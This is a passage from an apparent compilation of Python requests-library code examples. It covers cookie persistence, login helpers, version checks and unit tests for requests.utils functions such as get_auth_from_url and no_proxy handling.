            r = self._execute(method="get", url=URL.profile(user_slug="zhijun-liu"))
            success = r.ok
        while not success:
            account = input("请输入Email或者手机号码:")
            password = input("请输入密码:")
            obj = Account()
            data = obj.login(account, password)
            if "error" not in data:
                success = True
                self.cookies = obj.cookies
            else:
                print(data["error"]["message"])
        else:
            return func(self, *args, **kwargs)

    return wrapper 
**************************************
def acquire_authentication_cookie(self, options):
        """Retrieve SPO auth cookie"""
        logger = self.logger(self.acquire_authentication_cookie.__name__)

        url = options['endpoint']

        session = requests.session()
        logger.debug_secrets("session: %s\nsession.post(%s, data=%s)", session, url, self.token)
        session.post(url, data=self.token, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        logger.debug_secrets("session.cookies: %s", session.cookies)
        cookies = requests.utils.dict_from_cookiejar(session.cookies)
        logger.debug_secrets("cookies: %s", cookies)
        if 'FedAuth' in cookies and 'rtFa' in cookies:
            self.FedAuth = cookies['FedAuth']
            self.rtFa = cookies['rtFa']
            return True
        self.error = "An error occurred while retrieving auth cookies"
        logger.error(self.error)
        return False 
**************************************
def copy_session(session: requests.Session) -> requests.Session:
    """Duplicates a requests.Session."""
    new = requests.Session()
    new.cookies = requests.utils.cookiejar_from_dict(requests.utils.dict_from_cookiejar(session.cookies))
    new.headers = session.headers.copy() # type: ignore
    return new 
**************************************
def save_session_to_file(self, sessionfile):
        """Not meant to be used directly, use :meth:`Instaloader.save_session_to_file`."""
        pickle.dump(requests.utils.dict_from_cookiejar(self._session.cookies), sessionfile) 
**************************************
def load_session_from_file(self, username, sessionfile):
        """Not meant to be used directly, use :meth:`Instaloader.load_session_from_file`."""
        session = requests.Session()
        session.cookies = requests.utils.cookiejar_from_dict(pickle.load(sessionfile))
        session.headers.update(self._default_http_header())
        session.headers.update({'X-CSRFToken': session.cookies.get_dict()['csrftoken']})
        self._session = session
        self.username = username 
**************************************
def __get_cookie():
        path = os.getcwd()
        path = os.path.join(path, 'cookie')

        if os.path.isfile(path):
            with open('cookie') as f:
                cookies = requests.utils.cookiejar_from_dict(pickle.load(f))
                return cookies, True
        else:
            return None, False 
**************************************
def test_get_auth_from_url(self):
        url = 'http://user:[email protected]/path?query=yes'
        assert ('user', 'pass') == requests.utils.get_auth_from_url(url) 
**************************************
def test_get_auth_from_url_encoded_spaces(self):
        url = 'http://user:pass%[email protected]/path?query=yes'
        assert ('user', 'pass pass') == requests.utils.get_auth_from_url(url) 
**************************************
def test_get_auth_from_url_not_encoded_spaces(self):
        url = 'http://user:pass [email protected]/path?query=yes'
        assert ('user', 'pass pass') == requests.utils.get_auth_from_url(url) 
**************************************
def test_get_auth_from_url_percent_chars(self):
        url = 'http://user%25user:[email protected]/path?query=yes'
        assert ('user%user', 'pass') == requests.utils.get_auth_from_url(url) 
**************************************
def test_get_auth_from_url_encoded_hashes(self):
        url = 'http://user:pass%[email protected]/path?query=yes'
        assert ('user', 'pass#pass') == requests.utils.get_auth_from_url(url) 
**************************************
def test_html_charset(self):
        """HTML5 meta charset attribute"""
        content = '<meta charset="UTF-8">'
        encodings = requests.utils.get_encodings_from_content(content)
        assert len(encodings) == 1
        assert encodings[0] == 'UTF-8' 
**************************************
def test_html4_pragma(self):
        """HTML4 pragma directive"""
        content = '<meta http-equiv="Content-type" content="text/html;charset=UTF-8">'
        encodings = requests.utils.get_encodings_from_content(content)
        assert len(encodings) == 1
        assert encodings[0] == 'UTF-8' 
**************************************
def test_xhtml_pragma(self):
        """XHTML 1.x served with text/html MIME type"""
        content = '<meta http-equiv="Content-type" content="text/html;charset=UTF-8" />'
        encodings = requests.utils.get_encodings_from_content(content)
        assert len(encodings) == 1
        assert encodings[0] == 'UTF-8' 
**************************************
def test_xml(self):
        """XHTML 1.x served as XML"""
        content = '<?xml version="1.0" encoding="UTF-8"?>'
        encodings = requests.utils.get_encodings_from_content(content)
        assert len(encodings) == 1
        assert encodings[0] == 'UTF-8' 
**************************************
def test_precedence(self):
        content = '''
        <?xml version="1.0" encoding="XML"?>
        <meta charset="HTML5">
        <meta http-equiv="Content-type" content="text/html;charset=HTML4" />
        '''.strip()
        encodings = requests.utils.get_encodings_from_content(content)
        assert encodings == ['HTML5', 'HTML4', 'XML'] 
**************************************
def test_get_environ_proxies_ip_ranges(self):
        """Ensures that IP addresses are correctly matches with ranges
        in no_proxy variable."""
        from requests.utils import get_environ_proxies
        os.environ['no_proxy'] = "192.168.0.0/24,127.0.0.1,localhost.localdomain,172.16.1.1"
        assert get_environ_proxies('http://192.168.0.1:5000/') == {}
        assert get_environ_proxies('http://192.168.0.1/') == {}
        assert get_environ_proxies('http://172.16.1.1/') == {}
        assert get_environ_proxies('http://172.16.1.1:5000/') == {}
        assert get_environ_proxies('http://192.168.1.1:5000/') != {}
        assert get_environ_proxies('http://192.168.1.1/') != {} 
**************************************
def test_get_environ_proxies(self):
        """Ensures that IP addresses are correctly matches with ranges
        in no_proxy variable."""
        from requests.utils import get_environ_proxies
        os.environ['no_proxy'] = "127.0.0.1,localhost.localdomain,192.168.0.0/24,172.16.1.1"
        assert get_environ_proxies(
            'http://localhost.localdomain:5000/v1.0/') == {}
        assert get_environ_proxies('http://www.requests.com/') != {} 
**************************************
def test_guess_filename_when_int(self):
        from requests.utils import guess_filename
        assert None is guess_filename(1) 
**************************************
def test_guess_filename_when_filename_is_an_int(self):
        from requests.utils import guess_filename
        fake = type('Fake', (object,), {'name': 1})()
        assert None is guess_filename(fake) 
**************************************
def test_guess_filename_with_file_like_obj(self):
        from requests.utils import guess_filename
        from requests import compat
        fake = type('Fake', (object,), {'name': b'value'})()
        guessed_name = guess_filename(fake)
        assert b'value' == guessed_name
        assert isinstance(guessed_name, compat.bytes) 
**************************************
def test_is_ipv4_address(self):
        from requests.utils import is_ipv4_address
        assert is_ipv4_address('8.8.8.8')
        assert not is_ipv4_address('8.8.8.8.8')
        assert not is_ipv4_address('localhost.localdomain') 
**************************************
def test_is_valid_cidr(self):
        from requests.utils import is_valid_cidr
        assert not is_valid_cidr('8.8.8.8')
        assert is_valid_cidr('192.168.1.0/24') 
**************************************
def test_dotted_netmask(self):
        from requests.utils import dotted_netmask
        assert dotted_netmask(8) == '255.0.0.0'
        assert dotted_netmask(24) == '255.255.255.0'
        assert dotted_netmask(25) == '255.255.255.128' 
**************************************
def test_address_in_network(self):
        from requests.utils import address_in_network
        assert address_in_network('192.168.1.1', '192.168.1.0/24')
        assert not address_in_network('172.16.0.1', '192.168.1.0/24') 
**************************************
def test_get_auth_from_url(self):
        """Ensures that username and password in well-encoded URI as per
        RFC 3986 are correclty extracted."""
        from requests.utils import get_auth_from_url
        from requests.compat import quote
        percent_encoding_test_chars = "%!*'();:@&=+$,/?#[] "
        url_address = "request.com/url.html#test"
        url = "http://" + quote(
            percent_encoding_test_chars, '') + ':' + quote(
            percent_encoding_test_chars, '') + '@' + url_address
        (username, password) = get_auth_from_url(url)
        assert username == percent_encoding_test_chars
        assert password == percent_encoding_test_chars 
**************************************
def test_requote_uri_properly_requotes(self):
        """Ensure requoting doesn't break expectations."""
        from requests.utils import requote_uri
        quoted = 'http://example.com/fiz?buz=%25ppicture'
        assert quoted == requote_uri(quoted) 
**************************************
def save_cookie(self, fname):
        with open(fname, 'w') as f:
            json.dump(requests.utils.dict_from_cookiejar(self.session.cookies), f) 
**************************************
def save_cookies(session):
    with open(cookie_path, 'w') as f:
        pickle.dump(requests.utils.dict_from_cookiejar(session.cookies), f) 
**************************************
def start_session(forceNew = False):
    session = requests.session()
    session.headers.update(headers)
    if os.path.exists(cookie_path) and forceNew != True:
        with open(cookie_path) as f:
            cookies = requests.utils.cookiejar_from_dict(pickle.load(f))
            session.cookies.update(cookies)
            session._new_ = False
    else:
        session._new_ = True
    return session 
**************************************
def reload_session(self):
    with open('cookies/cookie_' + self.user_id + '.ck') as f:
        cookies = requests.utils.cookiejar_from_dict(pickle.load(f))
        self.s.cookies = cookies 
**************************************
def authenticate(self):
        """Authenticate the user and setup our state."""
        valid = self._session_check()
        if self._is_authenticated and valid:
            self._log.debug("[!] User has already authenticated")
            return
        init = self._session.get(url=self.LOGIN_URL, headers=self.HEADERS)
        soup = BeautifulSoup(init.content, "html.parser")
        soup_login = soup.find('form').find_all('input')
        post_data = dict()
        for u in soup_login:
            if u.has_attr('name') and u.has_attr('value'):
                post_data[u['name']] = u['value']
        post_data['Email'] = self._email
        post_data['Passwd'] = self._password
        response = self._session.post(url=self.AUTH_URL, data=post_data,
                                      headers=self.HEADERS)
        if self.CAPTCHA_KEY in str(response.content):
            raise AccountCaptcha('Google is forcing a CAPTCHA. To get around this issue, run the google-alerts with the seed option to open an interactive authentication session. Once authenticated, this module will cache your session and load that in the future')
        cookies = [x.name for x in response.cookies]
        if 'SIDCC' not in cookies:
            raise InvalidCredentials("Email or password was incorrect.")
        with open(SESSION_FILE, 'wb') as f:
            cookies = requests.utils.dict_from_cookiejar(self._session.cookies)
            pickle.dump(cookies, f, protocol=2)
            self._log.debug("Saved session to disk for future reference")
        self._log.debug("User successfully authenticated")
        self._is_authenticated = True
        self._process_state()
        return 
**************************************
def test_get_auth_from_url(self):
        url = 'http://user:[email protected]/path?query=yes'
        assert ('user', 'pass') == requests.utils.get_auth_from_url(url) 
**************************************
def test_get_auth_from_url_encoded_spaces(self):
        url = 'http://user:pass%[email protected]/path?query=yes'
        assert ('user', 'pass pass') == requests.utils.get_auth_from_url(url) 
**************************************
def test_get_auth_from_url_not_encoded_spaces(self):
        url = 'http://user:pass [email protected]/path?query=yes'
        assert ('user', 'pass pass') == requests.utils.get_auth_from_url(url) 
**************************************
def test_get_auth_from_url_percent_chars(self):
        url = 'http://user%25user:[email protected]/path?query=yes'
        assert ('user%user', 'pass') == requests.utils.get_auth_from_url(url) 
**************************************
def test_get_auth_from_url_encoded_hashes(self):
        url = 'http://user:pass%[email protected]/path?query=yes'
        assert ('user', 'pass#pass') == requests.utils.get_auth_from_url(url) 
**************************************
def test_html_charset(self):
        """HTML5 meta charset attribute"""
        content = '<meta charset="UTF-8">'
        encodings = requests.utils.get_encodings_from_content(content)
        assert len(encodings) == 1
        assert encodings[0] == 'UTF-8' 
**************************************
def test_html4_pragma(self):
        """HTML4 pragma directive"""
        content = '<meta http-equiv="Content-type" content="text/html;charset=UTF-8">'
        encodings = requests.utils.get_encodings_from_content(content)
        assert len(encodings) == 1
        assert encodings[0] == 'UTF-8' 
**************************************
def test_xhtml_pragma(self):
        """XHTML 1.x served with text/html MIME type"""
        content = '<meta http-equiv="Content-type" content="text/html;charset=UTF-8" />'
        encodings = requests.utils.get_encodings_from_content(content)
        assert len(encodings) == 1
        assert encodings[0] == 'UTF-8' 
**************************************
def test_xml(self):
        """XHTML 1.x served as XML"""
        content = '<?xml version="1.0" encoding="UTF-8"?>'
        encodings = requests.utils.get_encodings_from_content(content)
        assert len(encodings) == 1
        assert encodings[0] == 'UTF-8' 
**************************************
def test_precedence(self):
        content = '''
        <?xml version="1.0" encoding="XML"?>
        <meta charset="HTML5">
        <meta http-equiv="Content-type" content="text/html;charset=HTML4" />
        '''.strip()
        encodings = requests.utils.get_encodings_from_content(content)
        assert encodings == ['HTML5', 'HTML4', 'XML'] 
**************************************
def test_super_len_correctly_calculates_len_of_partially_read_file(self):
        """Ensure that we handle partially consumed file like objects."""
        from requests.utils import super_len
        s = StringIO.StringIO()
        s.write('foobarbogus')
        assert super_len(s) == 0 
**************************************
def test_get_environ_proxies_ip_ranges(self):
        """Ensures that IP addresses are correctly matches with ranges
        in no_proxy variable."""
        from requests.utils import get_environ_proxies
        os.environ['no_proxy'] = "192.168.0.0/24,127.0.0.1,localhost.localdomain,172.16.1.1"
        assert get_environ_proxies('http://192.168.0.1:5000/') == {}
        assert get_environ_proxies('http://192.168.0.1/') == {}
        assert get_environ_proxies('http://172.16.1.1/') == {}
        assert get_environ_proxies('http://172.16.1.1:5000/') == {}
        assert get_environ_proxies('http://192.168.1.1:5000/') != {}
        assert get_environ_proxies('http://192.168.1.1/') != {} 
**************************************
def test_get_environ_proxies(self):
        """Ensures that IP addresses are correctly matches with ranges
        in no_proxy variable."""
        from requests.utils import get_environ_proxies
        os.environ['no_proxy'] = "127.0.0.1,localhost.localdomain,192.168.0.0/24,172.16.1.1"
        assert get_environ_proxies(
            'http://localhost.localdomain:5000/v1.0/') == {}
        assert get_environ_proxies('http://www.requests.com/') != {} 
**************************************
def test_select_proxies(self):
        """Make sure we can select per-host proxies correctly."""
        from requests.utils import select_proxy
        proxies = {'http': 'http://http.proxy',
                   'http://some.host': 'http://some.host.proxy'}
        assert select_proxy('hTTp://u:[email protected]/path', proxies) == 'http://some.host.proxy'
        assert select_proxy('hTTp://u:[email protected]/path', proxies) == 'http://http.proxy'
        assert select_proxy('hTTps://Other.Host', proxies) is None 
**************************************
def test_guess_filename_when_int(self):
        from requests.utils import guess_filename
        assert None is guess_filename(1) 
**************************************
def test_guess_filename_with_file_like_obj(self):
        from requests.utils import guess_filename
        from requests import compat
        fake = type('Fake', (object,), {'name': b'value'})()
        guessed_name = guess_filename(fake)
        assert b'value' == guessed_name
        assert isinstance(guessed_name, compat.bytes) 
**************************************
def test_guess_filename_with_unicode_name(self):
        from requests.utils import guess_filename
        from requests import compat
        filename = b'value'.decode('utf-8')
        fake = type('Fake', (object,), {'name': filename})()
        guessed_name = guess_filename(fake)
        assert filename == guessed_name
        assert isinstance(guessed_name, compat.str) 
**************************************
def test_is_ipv4_address(self):
        from requests.utils import is_ipv4_address
        assert is_ipv4_address('8.8.8.8')
        assert not is_ipv4_address('8.8.8.8.8')
        assert not is_ipv4_address('localhost.localdomain') 
**************************************
def test_is_valid_cidr(self):
        from requests.utils import is_valid_cidr
        assert not is_valid_cidr('8.8.8.8')
        assert is_valid_cidr('192.168.1.0/24') 
**************************************
def test_dotted_netmask(self):
        from requests.utils import dotted_netmask
        assert dotted_netmask(8) == '255.0.0.0'
        assert dotted_netmask(24) == '255.255.255.0'
        assert dotted_netmask(25) == '255.255.255.128' 
**************************************
def test_get_auth_from_url(self):
        """Ensures that username and password in well-encoded URI as per
        RFC 3986 are correclty extracted."""
        from requests.utils import get_auth_from_url
        from requests.compat import quote
        percent_encoding_test_chars = "%!*'();:@&=+$,/?#[] "
        url_address = "request.com/url.html#test"
        url = "http://" + quote(
            percent_encoding_test_chars, '') + ':' + quote(
            percent_encoding_test_chars, '') + '@' + url_address
        (username, password) = get_auth_from_url(url)
        assert username == percent_encoding_test_chars
        assert password == percent_encoding_test_chars 
**************************************
def test_requote_uri_with_unquoted_percents(self):
        """Ensure we handle unquoted percent signs in redirects.

        See: https://github.com/kennethreitz/requests/issues/2356
        """
        from requests.utils import requote_uri
        bad_uri = 'http://example.com/fiz?buz=%ppicture'
        quoted = 'http://example.com/fiz?buz=%25ppicture'
        assert quoted == requote_uri(bad_uri) 
**************************************
def test_requote_uri_properly_requotes(self):
        """Ensure requoting doesn't break expectations."""
        from requests.utils import requote_uri
        quoted = 'http://example.com/fiz?buz=%25ppicture'
        assert quoted == requote_uri(quoted) 
**************************************
def load_cookie(cls):
        cookies = None

        if os.path.exists(config.COOKIE_FILE):
            with open(config.COOKIE_FILE) as fp:
                try:
                    cookies = requests.utils.cookiejar_from_dict(json.load(fp))
                    logger.info('load cookies from {filename}'.format(filename=config.COOKIE_FILE))
                except json.decoder.JSONDecodeError:
                    cookies = None

        return cookies 
**************************************
def dump_cookie(self):
        cookies = self.session.cookies
        for cookie in cookies:
            if cookie.name == 't' and cookie.path != '/':
                cookies.clear(cookie.domain, cookie.path, cookie.name)
        with open(config.COOKIE_FILE, 'w') as fp:
            json.dump(requests.utils.dict_from_cookiejar(cookies), fp) 
**************************************
def _request(self, method, url, params=None, data=None, headers=None):
		# add passed headers
		if headers is not None:
			for key in headers.keys():
				self.headers[key] = headers[key]
		# implement method params
		self.response = self.session.request(method, url, headers=self.headers)
		#print('\tCookies for EditThisCookie\t')
		#print(f'####################################################################################################################################{self.colorText}')
		#for key, value in requests.utils.dict_from_cookiejar(self.response.cookies).items():
		#	print(f'{key}: {value}\n')
		#print(f'{COLOR_END}####################################################################################################################################')
		self.build_edit_this_cookie(requests.utils.dict_from_cookiejar(self.response.cookies)) 
**************************************
def saveSessionCookie(self, session, outputPath):
    	with open(outputPath, 'w') as f:
    	    pickle.dump(requests.utils.dict_from_cookiejar(session.cookies), f) 
**************************************
def loadSessionCookie(self, inputPath):
    	if not os.path.exists('cookiejar'):
    		return None

    	with open(inputPath) as f:
        	cookies = requests.utils.cookiejar_from_dict(pickle.load(f))
        	session = requests.session()
    		session.cookies = cookies
    	return session 
**************************************
def login(self):
    self.login_post = {
        'username': self.user_login,
        'password': self.user_password
    }

    self.s.headers.update({
        'Accept': '*/*',
        'Accept-Language': self.accept_language,
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Content-Length': '0',
        'Host': 'www.instagram.com',
        'Origin': 'https://www.instagram.com',
        'Referer': 'https://www.instagram.com/',
        'User-Agent': self.user_agent,
        'X-Instagram-AJAX': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest'
    })
    r = self.s.get(url)
    self.s.headers.update({'X-CSRFToken': r.cookies['csrftoken']})
    time.sleep(1 * random.random())

    login = self.s.post(
        url_login, data=self.login_post, allow_redirects=True)
    self.s.headers.update({'X-CSRFToken': login.cookies['csrftoken']})
    self.csrftoken = login.cookies['csrftoken']
    # ig_vw=1536; ig_pr=1.25; ig_vh=772;  ig_or=landscape-primary;
    self.s.cookies['ig_vw'] = '1536'
    self.s.cookies['ig_pr'] = '1.25'
    self.s.cookies['ig_vh'] = '772'
    self.s.cookies['ig_or'] = 'landscape-primary'
    time.sleep(3 * random.random())

    if login.status_code == 200:
        response = json.loads(login.text)
        self.login_status = response['authenticated']
        if self.login_status == True:
            self.user_id = response['userId']
            with open('cookies/cookie_' + self.user_id + '.ck', 'w') as f:
                pickle.dump(requests.utils.dict_from_cookiejar(
                    self.s.cookies), f)           
    else:
        self.login_status = False

    return self.login_status, self.csrftoken, self.user_id 

Python requests.compat() Examples

**************************************
def __request(self, endpoint, query):
		response_object = self.session.get(requests.compat.urljoin(self.base_url + endpoint, query),
		                                   timeout = self.request_timeout)

		try:
			response = json.loads(response_object.text)
		except Exception as e:
			return e

		return response 
**************************************
def test_unicode_header_name(self, httpbin):
        requests.put(
            httpbin('put'),
            headers={str('Content-Type'): 'application/octet-stream'},
            data='\xff')  # compat.str is unicode. 
**************************************
def test_unicode_header_name(self, httpbin):
        requests.put(
            httpbin('put'),
            headers={str('Content-Type'): 'application/octet-stream'},
            data='\xff')  # compat.str is unicode. 
**************************************
def test_unicode_header_name(self):
        requests.put(
            httpbin('put'),
            headers={str('Content-Type'): 'application/octet-stream'},
            data='\xff')  # compat.str is unicode. 
**************************************
def test_guess_filename_with_file_like_obj(self):
        from requests.utils import guess_filename
        from requests import compat
        fake = type('Fake', (object,), {'name': b'value'})()
        guessed_name = guess_filename(fake)
        assert b'value' == guessed_name
        assert isinstance(guessed_name, compat.bytes) 
**************************************
def test_guess_filename_with_unicode_name(self):
        from requests.utils import guess_filename
        from requests import compat
        filename = b'value'.decode('utf-8')
        fake = type('Fake', (object,), {'name': filename})()
        guessed_name = guess_filename(fake)
        assert filename == guessed_name
        assert isinstance(guessed_name, compat.str) 
**************************************
def test_get_auth_from_url(self):
        """Ensures that username and password in well-encoded URI as per
        RFC 3986 are correclty extracted."""
        from requests.utils import get_auth_from_url
        from requests.compat import quote
        percent_encoding_test_chars = "%!*'();:@&=+$,/?#[] "
        url_address = "request.com/url.html#test"
        url = "http://" + quote(
            percent_encoding_test_chars, '') + ':' + quote(
            percent_encoding_test_chars, '') + '@' + url_address
        (username, password) = get_auth_from_url(url)
        assert username == percent_encoding_test_chars
        assert password == percent_encoding_test_chars 
**************************************
def test_unicode_header_name(self, httpbin):
        requests.put(
            httpbin('put'),
            headers={str('Content-Type'): 'application/octet-stream'},
            data='\xff')  # compat.str is unicode. 
**************************************
def test_guess_filename_with_file_like_obj(self):
        from requests.utils import guess_filename
        from requests import compat
        fake = type('Fake', (object,), {'name': b'value'})()
        guessed_name = guess_filename(fake)
        assert b'value' == guessed_name
        assert isinstance(guessed_name, compat.bytes) 
**************************************
def test_guess_filename_with_unicode_name(self):
        from requests.utils import guess_filename
        from requests import compat
        filename = b'value'.decode('utf-8')
        fake = type('Fake', (object,), {'name': filename})()
        guessed_name = guess_filename(fake)
        assert filename == guessed_name
        assert isinstance(guessed_name, compat.str) 
**************************************
def test_get_auth_from_url(self):
        """Ensures that username and password in well-encoded URI as per
        RFC 3986 are correclty extracted."""
        from requests.utils import get_auth_from_url
        from requests.compat import quote
        percent_encoding_test_chars = "%!*'();:@&=+$,/?#[] "
        url_address = "request.com/url.html#test"
        url = "http://" + quote(
            percent_encoding_test_chars, '') + ':' + quote(
            percent_encoding_test_chars, '') + '@' + url_address
        (username, password) = get_auth_from_url(url)
        assert username == percent_encoding_test_chars
        assert password == percent_encoding_test_chars 
**************************************
def open_remote(url, entry, container, user_parameters, description, http_args,
                page_size=None, auth=None, getenv=None, getshell=None):
    """Create either local direct data source or remote streamed source"""
    from intake.container import container_map
    import msgpack
    import requests
    from requests.compat import urljoin

    if url.startswith('intake://'):
        url = url[len('intake://'):]
    payload = dict(action='open',
                   name=entry,
                   parameters=user_parameters,
                   available_plugins=list(plugin_registry.keys()))
    req = requests.post(urljoin(url, '/v1/source'),
                        data=msgpack.packb(payload, **pack_kwargs),
                        **http_args)
    if req.ok:
        response = msgpack.unpackb(req.content, **unpack_kwargs)

        if 'plugin' in response:
            pl = response['plugin']
            pl = [pl] if isinstance(pl, str) else pl
            # Direct access
            for p in pl:
                if p in plugin_registry:
                    source = plugin_registry[p](**response['args'])
                    proxy = False
                    break
            else:
                proxy = True
        else:
            proxy = True
        if proxy:
            response.pop('container')
            response.update({'name': entry, 'parameters': user_parameters})
            if container == 'catalog':
                response.update({'auth': auth,
                                 'getenv': getenv,
                                 'getshell': getshell,
                                 'page_size': page_size
                                 # TODO ttl?
                                 # TODO storage_options?
                                 })
            source = container_map[container](url, http_args, **response)
        source.description = description
        return source

    else:
        raise Exception('Server error: %d, %s' % (req.status_code, req.reason)) 
**************************************
def get_current_filename(jupyter_port=8888):
    '''
    # Get Current Filename
    
    # Description
        Get file name from file that executed this call
    This function is needed in order to read the file and split the code into modules

    # Arguments
        jupyter_port: int or string
            If called from within a jupyter notebook, the port where it is currently running, defaults to jupyter's default, 8888.

    # Examples
    
    # Credits
        Jupyter notebook section inspired by: https://github.com/jupyter/notebook/issues/1000
    '''
    import sys
    filetype = 'script'
    current_filename = sys.argv[0]

    # Check if it is a jupyter notebook
    if sys.argv[0].find('ipykernel_launcher') != -1:
        import json
        import os.path
        import re
        import ipykernel
        import requests
        from requests.compat      import urljoin
        from notebook.notebookapp import list_running_servers

        # Extract kernel id and retrieve list of active servers
        kernel_id = re.search('kernel-(.*).json', ipykernel.connect.get_connection_file()).group(1)
        servers   = list_running_servers()

        # Send a request to each server in order to obtain more info about it
        for server in servers:
            response = requests.get("http://127.0.0.1:" + str(jupyter_port) + "/api/sessions",
                                    params={'token': server['token']})

            # If the current notebook is the desired kernel id, return path to notebook file
            for nn in json.loads(response.text):
                if nn['kernel']['id'] == kernel_id:
                    relative_path = nn['notebook']['path']
                    return(os.path.join(server['notebook_dir'], relative_path), filetype)

    else:
        return(current_filename, filetype) 

Python requests.__version__() Examples

**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.module = module
        self.policy_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.module = module

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.clc = clc_sdk
        self.module = module
        self.lb_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.module = module
        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.clc = clc_sdk
        self.module = module

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.clc = clc_sdk
        self.module = module
        self.group_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.clc = clc_sdk
        self.module = module
        self.group_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def sanity_check_dependencies():
    import numpy
    import requests
    import six

    if distutils.version.LooseVersion(numpy.__version__) < distutils.version.LooseVersion('1.10.4'):
        logger.warn("You have 'numpy' version %s installed, but 'gym' requires at least 1.10.4. HINT: upgrade via 'pip install -U numpy'.", numpy.__version__)

    if distutils.version.LooseVersion(requests.__version__) < distutils.version.LooseVersion('2.0'):
        logger.warn("You have 'requests' version %s installed, but 'gym' requires at least 2.0. HINT: upgrade via 'pip install -U requests'.", requests.__version__)

# We automatically configure a logger with a simple stderr handler. If
# you'd rather customize logging yourself, run undo_logger_setup.
#
# (Note: this needs to happen before importing the rest of gym, since
# we may print a warning at load time.) 
**************************************
def __init__(self,
                 timeout=None,
                 verify_cert=True):
        self.timeout = timeout
        self.verify_cert = verify_cert

        if self.timeout is not None:
            try:
                self.timeout = float(self.timeout)
                if not self.timeout >= 0:
                    raise ValueError
            except ValueError:
                raise PanHttpError('Invalid timeout: %s' % self.timeout)

        self.using_requests = _using_requests

        if self.using_requests:
            self._http_request = self._http_request_requests
            if not self.verify_cert:
                requests.packages.urllib3.disable_warnings()
            self.requests_version = requests.__version__
        else:
            self._http_request = self._http_request_urllib 
**************************************
def log_current_versions():
    """Show current installed versions"""
    if logger.root.isEnabledFor(logging.DEBUG):
        # MAC OS X
        if sys.platform == "darwin":
            os_version = "macOS {0}".format(platform.mac_ver()[0])
        # Windows
        elif sys.platform.startswith("win"):
            os_version = "{0} {1}".format(platform.system(), platform.release())
        # linux / other
        else:
            os_version = platform.platform()

        log.debug("OS:         {0}".format(os_version))
        log.debug("Python:     {0}".format(platform.python_version()))
        log.debug("Streamlink: {0}".format(streamlink_version))
        log.debug("Requests({0}), Socks({1}), Websocket({2})".format(
            requests.__version__, socks_version, websocket_version)) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.module = module
        self.policy_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.module = module

        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.module = module
        if not CLC_FOUND:
            self.module.fail_json(
                msg='clc-python-sdk required for this module')
        if not REQUESTS_FOUND:
            self.module.fail_json(
                msg='requests library is required for this module')
        if requests.__version__ and LooseVersion(
                requests.__version__) < LooseVersion('2.5.0'):
            self.module.fail_json(
                msg='requests library  version should be >= 2.5.0')

        self._set_user_agent(self.clc) 
**************************************
def __init__(self, module):
        """
        Construct module
        """
        self.clc = clc_sdk
        self.module = module
        self.lb_dict = {}

        if not CLC_FOUND:
            self.module.fail_json(
